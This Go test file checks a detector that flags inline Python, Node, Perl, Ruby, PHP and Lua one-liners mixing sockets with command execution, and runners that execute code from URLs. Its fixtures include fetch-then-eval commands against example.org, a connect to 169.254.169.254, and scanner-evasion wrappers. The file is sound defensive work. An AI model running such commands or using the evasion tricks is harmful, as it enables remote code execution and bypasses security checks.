// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"strconv"
	"strings"
	"testing"
)

func shellQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", `'\''`) + "'"
}

// inlinePositive is one interpreter one-liner that asks for network and exec.
type inlinePositive struct {
	name, program, flag, code string
}

var inlinePositives = []inlinePositive{
	{"python", "python3", "-c", `import socket,subprocess; s=socket.socket(); subprocess.call(["id"])`},
	{"node", "node", "-e", `const n=require('net'); require('child_process').exec('id')`},
	{"perl", "perl", "-e", `use IO::Socket; system("id")`},
	{"ruby", "ruby", "-e", `require 'socket'; system("id")`},
	{"php", "php", "-r", `$s=fsockopen("example.org",1); popen("id","r");`},
	{"lua", "lua", "-e", `local s=require("socket"); os.execute("id")`},
}

func inlineCommand(program, flag, code string) string {
	return program + " " + flag + " " + shellQuote(code)
}

func TestInlineCodeNetworkAndExec(t *testing.T) {
	for _, test := range []struct {
		name, command string
		want          bool
	}{
		{"python socket and subprocess", `python3 -c 'import socket,subprocess; s=socket.socket(); subprocess.call(["id"])'`, true},
		{"python url and os.system", `python3 -c "import os; os.system('curl https://example.org/x')"`, true},
		{"loopback service test is not a connection out", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('127.0.0.1', 9))"`, false},
		{"loopback and a public host", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('203.0.113.9', 9)); x='127.0.0.1'"`, true},
		{"python exec only", `python3 -c "import os; os.system('ls')"`, false},
		{"python network only", `python3 -c "import urllib.request; print(1)"`, false},
		{"node net and child_process", `node -e "const n=require('net'); require('child_process').exec('id')"`, true},
		{"node fetch and eval", `node -e "fetch('https://example.org').then(r=>r.text()).then(t=>eval(t))"`, true},
		{"node plain", `node -e "console.log(1+1)"`, false},
		{"perl socket and system", `perl -e 'use IO::Socket; system("id")'`, true},
		{"ruby exec only", `ruby -e 'system("make")'`, false},
		{"php fsockopen and popen", `php -r '$s=fsockopen("example.org",1); popen("id","r");'`, true},
		{"identifier boundary", `python3 -c "mysocketlist=[]; mysubprocessx=1"`, false},
		{"script file", `python3 script.py`, false},
		// the whole operand is read as text: a sentence that names both libraries
		// alerts (the price of never reading code as prose); code is never missed
		{"names only inside a string", `python3 -c "print('socket and subprocess are stdlib modules')"`, true},
		{"names only inside a comment", "python3 -c \"import json  # socket subprocess\\nprint(1)\"", true},
		{"node names only in log text", `node -e "console.log('net eval')"`, true},
		{"one capability named in prose", `python3 -c "print('subprocess is a module')"`, false},
		{"node template expression is code", "node -e 'const s = `${require(\"net\")} ${require(\"child_process\")}`'", true},
		{"php reads a local file and echoes text that names exec", `php -r 'echo "run it"; $c = file_get_contents("composer.json");'`, false},
		{"php reads a local file and execs", `php -r '$c = file_get_contents("composer.json"); system("make");'`, false},
		{"php fetches a url and execs", `php -r '$c = file_get_contents("https://example.org/x"); system($c);'`, true},
		{"perl backtick runs a command next to a url", "perl -e 'use LWP::Simple; print `id`'", true},
		// loopback only, with nothing read from outside the code
		{"localhost name", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('localhost', 9))"`, false},
		{"name under .localhost", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('api.localhost', 9))"`, false},
		{"library file name is not a host", `python3 -c "import ctypes,subprocess; ctypes.CDLL('libc.so.6'); subprocess.run(['curl','http://127.0.0.1:9000'])"`, false},
		{"version string is not a host", `python3 -c "import subprocess,urllib.request; subprocess.run(['x']); v='3.8.10'; urllib.request.urlopen('http://localhost/')"`, false},
		{"loopback host with another host under an unlisted ending", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('127.0.0.1', 9)); socket.socket().connect(('host.example.travel', 9))"`, true},
		{"dotted name that only looks local", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('localhost.example.org', 9))"`, true},
		{"host with a port and no scheme", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('127.0.0.1', 9)); h='host.example.org:80'"`, true},
		// SHREV2-07 and SHREV2-08
		{"loopback literal next to a host read from the environment", `python3 -c "import os,socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect((os.environ['H'], 9)); x='127.0.0.1'"`, true},
		{"loopback literal next to a host read from argv", `node -e "const n=require('net'); require('child_process').exec('id'); n.connect(9, process.argv[1]); const x='127.0.0.1'"`, true},
		{"private range literal is a network destination", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('10.0.0.5', 9))"`, true},
		{"link-local literal is a network destination", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('169.254.169.254', 80))"`, true},
		{"bare IPv6 literal", `python3 -c "import socket,subprocess; subprocess.Popen(['./d']); socket.socket().connect(('2001:db8::1', 9)); x='127.0.0.1'"`, true},
	} {
		t.Run(test.name, func(t *testing.T) {
			if got := InlineCodeNetworkAndExec(srFacts(test.command)); got != test.want {
				t.Fatalf("got %t want %t for %q", got, test.want, test.command)
			}
		})
	}
}

// TestInlineCodeScanDoesNotFailOpen builds the SHREV2 and SHREV3 cases from the
// positive fixtures above: every transform hides the same capabilities from a
// scan that blanks strings or trusts its own reading of the quoting, and each
// must still report. The scan reads the whole operand as text, so none of them
// can hide anything.
func TestInlineCodeScanDoesNotFailOpen(t *testing.T) {
	// the code given to the language's code-from-string builtin, as one string
	evalForm := map[string]string{
		"python": "exec(%s)", "node": "eval(%s)", "ruby": "eval(%s)", "php": "eval(%s);",
		"perl": "eval %s", "lua": "load(%s)()",
	}
	// regular-expression, quote-like, special-variable and long-bracket spellings
	// that make a quote-counting reader flip between code and string
	wrappers := map[string]func(string) string{
		"regex with a quote before the code":  func(code string) string { return "x = /'/; " + code + "; y = /'/" },
		"keyword then regex with a quote":     func(code string) string { return "return /'/.test(a); " + code + "; typeof /'/" },
		"special variable with a quote":       func(code string) string { return "$' = 1; " + code + "; $' = 2" },
		"character literal with a quote":      func(code string) string { return "x = ?'; " + code + "; y = ?'" },
		"long bracket level 2":                func(code string) string { return "--[==[ ' ]==] " + code },
		"unterminated string tail":            func(code string) string { return code + `; x = "never closed` },
		"unterminated comment tail":           func(code string) string { return code + " /* never closed" },
		"hash that is not a comment":          func(code string) string { return "$#a = 1; " + code },
		"hash as a substitution delimiter":    func(code string) string { return "$x =~ s#a#b#; " + code },
		"more than 48 bytes before the names": func(code string) string { return strings.Repeat(" ", 80) + code },
	}
	for _, fixture := range inlinePositives {
		t.Run("eval "+fixture.name, func(t *testing.T) {
			code := strings.Replace(evalForm[fixture.name], "%s", strconv.Quote(fixture.code), 1)
			if command := inlineCommand(fixture.program, fixture.flag, code); !InlineCodeNetworkAndExec(srFacts(command)) {
				t.Fatalf("code given to an eval-style sink is not reported: %q", command)
			}
		})
		for name, wrap := range wrappers {
			t.Run(name+" "+fixture.name, func(t *testing.T) {
				if command := inlineCommand(fixture.program, fixture.flag, wrap(fixture.code)); !InlineCodeNetworkAndExec(srFacts(command)) {
					t.Fatalf("not reported: %q", command)
				}
			})
		}
	}
	for _, test := range []struct{ name, program, flag, code string }{
		{"python module attribute loader", "python3", "-c", `import builtins; builtins.__import__('socket'); builtins.__import__('subprocess')`},
		{"python importlib alias", "python3", "-c", `import importlib as i; i.import_module("socket"); i.import_module("subprocess")`},
		{"node module.require", "node", "-e", `module.require('net'); module.require('child_process')`},
		{"node node: prefix", "node", "-e", `const a = require("node:net"); const b = require("node:child_process")`},
		{"python f-string", "python3", "-c", `print(f"{__import__('socket')}{__import__('subprocess')}")`},
		{"ruby interpolation", "ruby", "-e", `puts "#{require 'socket'}#{system('id')}"`},
		{"ruby heredoc", "ruby", "-e", "puts <<EOS\nx\nEOS\nrequire 'socket'; system('id')"},
		{"ruby percent literal", "ruby", "-e", `x = %w(a b); require 'socket'; system('id')`},
		{"lua long string", "lua", "-e", `local s = [==[ ' ]==]; local c = require("socket"); os.execute("id")`},
	} {
		t.Run(test.name, func(t *testing.T) {
			if command := inlineCommand(test.program, test.flag, test.code); !InlineCodeNetworkAndExec(srFacts(command)) {
				t.Fatalf("not reported: %q", command)
			}
		})
	}
}

func TestTransparentWrappersAreReadForInlineCodeAndRunners(t *testing.T) {
	for _, prefix := range []string{"nohup ", "time ", "time -p ", "nice ", "nice -n 5 ", "timeout 5 ", "timeout -s KILL 5 ", "env A=b ", "command ", "env -i nohup nice -n 3 ", "ionice -c 3 ", "stdbuf -oL "} {
		if command := prefix + `python3 -c "import socket,subprocess; subprocess.call(['id']); socket.socket()"`; !InlineCodeNetworkAndExec(srFacts(command)) {
			t.Errorf("inline code behind a wrapper is not reported: %q", command)
		}
		if command := prefix + "npx https://example.org/a.tgz"; !RemoteRunnerURL(srFacts(command)) {
			t.Errorf("runner behind a wrapper is not reported: %q", command)
		}
		if command := prefix + "npx prettier --check ."; RemoteRunnerURL(srFacts(command)) {
			t.Errorf("a package runner behind a wrapper is reported: %q", command)
		}
	}
}

func TestRemoteRunnerURL(t *testing.T) {
	for _, test := range []struct {
		name, command string
		want          bool
	}{
		{"bun run url", "bun run https://example.org/a.ts", true},
		{"deno run url is a remote runner like the others", "deno run --allow-net https://example.org/a.ts", true},
		{"npx url", "npx https://example.org/a.tgz", true},
		{"pnpm dlx url", "pnpm dlx https://example.org/a.tgz", true},
		{"npm exec url", "npm exec https://example.org/a.tgz", true},
		{"npm x url", "npm x https://example.org/a.tgz", true},
		{"uv run url", "uv run https://example.org/a.py", true},
		{"pipx run url", "pipx run https://example.org/a.py", true},
		{"uvx url", "uvx https://example.org/a.tgz", true},
		{"option value before the url", "deno run --config x.json https://example.org/a.ts", true},
		{"npx package option before the url", "npx -p tool https://example.org/a.tgz", true},
		{"uppercase scheme", "npx HTTPS://example.org/a.tgz", true},
		{"mixed case scheme", "bun run Http://example.org/a.ts", true},
		{"option with an equals sign", "npx --package=tool https://example.org/a.tgz", true},
		{"bun run local script", "bun run build", false},
		{"deno run local", "deno run main.ts", false},
		{"deno run with the boolean reload flag", "deno run -r https://example.org/a.ts", true},
		{"deno run with the long reload flag", "deno run --reload https://example.org/a.ts", true},
		{"deno run local with a url option value", "deno run --config https://example.org/c.json main.ts", false},
		{"npx package", "npx prettier --check .", false},
		{"npm exec package", "npm exec prettier", false},
		{"uv run script", "uv run main.py", false},
		{"pipx run package", "pipx run black", false},
		{"bun install", "bun install https://example.org/a.tgz", false},
	} {
		t.Run(test.name, func(t *testing.T) {
			if got := RemoteRunnerURL(srFacts(test.command)); got != test.want {
				t.Fatalf("got %t want %t for %q", got, test.want, test.command)
			}
		})
	}
}
